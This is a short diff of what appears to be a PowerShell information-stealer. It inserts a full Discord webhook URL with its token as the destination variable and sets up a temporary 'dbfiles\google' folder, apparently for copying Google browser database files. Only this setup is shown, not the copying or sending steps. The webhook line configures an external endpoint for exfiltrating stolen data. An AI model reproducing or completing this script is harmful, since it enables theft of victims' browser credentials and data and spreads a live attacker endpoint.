@@ -1,5 +1,4 @@
-
-$dc = "$dc"
+$dc = "https://discord.com/api/webhooks/1319373771928371242/1H3fz9CwmmfHaKWLkZE4MVmIKGdMn1J3-hYok-7sxd_tW8LZevFvIG4Q16eeiV9fX2Sl"
 $temp = [System.IO.Path]::GetTempPath() 
 $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
 $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
